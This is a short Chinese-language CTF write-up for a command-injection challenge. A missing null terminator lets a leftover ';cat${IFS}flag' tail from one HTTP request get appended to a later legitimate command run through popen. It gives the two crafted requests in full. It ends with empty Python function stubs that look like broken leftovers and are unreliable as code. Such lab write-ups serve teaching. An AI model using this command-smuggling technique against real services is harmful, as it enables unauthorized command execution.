# 漏洞点

程序把命令字符串先 `snprintf` 到栈上，再用 `memcpy(cmd, buf, strlen(buf))` 拷到全局 `cmd`，但没有补结尾 `\0`。
这样我们可以先用一次更长的非法文件名把恶意尾巴残留在 `cmd` 里，再用一次合法的短请求覆盖前半段，最终让 `popen(cmd, "r")` 执行拼接后的命令。

# 攻击思路

1. 第一次请求不带合法 `ContentLength`，只负责污染 `cmd`：

```text
GET /ctf/index_html;cat${IFS}flag HTTP/1.1
Host: x
```

这次不会真正执行，但会把全局 `cmd` 写成：

```text
cat /home/ctf/index_html;cat${IFS}flag
```

2. 第二次发送合法请求：

```text
GET /ctf/index_html HTTP/1.1
Host: x
ContentLength: 10
```

由于第二次 `memcpy` 只覆盖前半段，没有写 `\0`，`cmd` 末尾残留的 `;cat${IFS}flag` 还在。  
于是实际执行的是：

```text
cat /home/ctf/index_html;cat flag
```

3. 程序会把命令输出逐行重新封装成 MQTT 消息发回，直接订阅 `HTTP` 即可拿到 flag。

def protect_ptr(chunk_addr, target):

def pwn(io):

    pwn(io)
